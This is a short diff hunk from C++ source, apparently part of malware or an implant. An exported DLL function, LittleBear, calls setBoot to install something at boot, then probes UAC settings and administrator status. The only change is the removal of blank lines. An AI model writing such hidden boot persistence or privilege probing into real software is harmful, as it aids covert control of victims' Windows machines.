@@ -118,8 +118,6 @@ extern "C" __declspec(dllexport) int __stdcall LittleBear()
 
 	iRet = setBoot(szSysDir, strPEResidence, iSystemVersion);
 
-
-
 	DWORD uac = IsUACEnable(iCpuBits, &iEnableLUA, &iConsentPromptBehaviorAdmin, &iPromptOnSecureDesktop);
 	iIsUserAdmin = IsAdministratorUser();
 	iIsProcessAdmin = IsAdminProcess(0);
